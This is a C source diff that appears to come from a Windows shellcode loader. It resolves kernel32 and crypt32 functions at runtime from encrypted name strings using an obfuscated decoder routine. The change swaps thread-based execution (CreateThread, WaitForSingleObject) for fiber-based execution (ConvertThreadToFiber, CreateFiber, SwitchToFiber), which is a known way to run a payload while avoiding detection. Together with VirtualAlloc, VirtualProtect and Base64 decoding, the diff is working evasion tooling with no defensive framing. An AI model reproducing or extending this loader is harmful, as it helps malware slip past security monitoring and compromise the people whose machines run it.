@@ -41,8 +41,9 @@ void boUpJkYnxh29(unsigned char * enc_func_name){
 /// -9 - Could not find CryptStringToBinaryA in crypt32.dll
 /// -10 - Could not find VirtualAlloc in kernel32.dll
 /// -11 - Could not find VirtualProtect in kernel32.dll
-/// -12 - Could not find CreateThread in kernel32.dll
-/// -13 - Could not find WaitForSingleObject in kernel32.dll
+/// -12 - Could not find ConvertThreadToFiber in kernel32.dll
+/// -13 - Could not find CreateFiber in kernel32.dll
+/// -14 - Could not find SwitchToFiber in kernel32.dll
 int __get_funcs(){
     _kernel32 = LoadLibrary((LPCWSTR)"kernel32.dll");
     if (_kernel32 == NULL){
@@ -119,18 +120,25 @@ int __get_funcs(){
         return -11;
     }
 
-    boUpJkYnxh29(__createthread);
-    _CreateThread = (__type_createthread)GetProcAddress(_kernel32, (LPCSTR)__createthread);
-    if (_CreateThread == NULL){
-        // fprintf(stderr, "Could not find CreateThread in kernel32.dll\n");
+    boUpJkYnxh29(__convertthreadtofiber);
+    _ConvertThreadToFiber = (__type_convertthreadtofiber)GetProcAddress(_kernel32, (LPCSTR)__convertthreadtofiber);
+    if(_ConvertThreadToFiber == NULL){
+        // fprintf(stderr, "Could not find ConvertThreadToFiber in kernel32.dll\n");
         return -12;
     }
 
-    boUpJkYnxh29(__waitforsingleobject);
-    _WaitForSingleObject = (__type_waitforsingleobject)GetProcAddress(_kernel32, (LPCSTR)__waitforsingleobject);
-    if (_WaitForSingleObject == NULL){
-        // fprintf(stderr, "Could not find WaitForSingleObject in kernel32.dll\n");
+    boUpJkYnxh29(__createfiber);
+    _CreateFiber = (__type_createfiber)GetProcAddress(_kernel32, (LPCSTR)__createfiber);
+    if(_CreateFiber == NULL){
+        // fprintf(stderr, "Could not find CreateFiber in kernel32.dll\n");
         return -13;
+    }
+
+    boUpJkYnxh29(__switchtofiber);
+    _SwitchToFiber = (__type_switchtofiber)GetProcAddress(_kernel32, (LPCSTR)__switchtofiber);
+    if(_SwitchToFiber == NULL){
+        // fprintf(stderr, "Could not find SwitchToFiber in kernel32.dll\n");
+        return -14;
     }
 
     return 0;
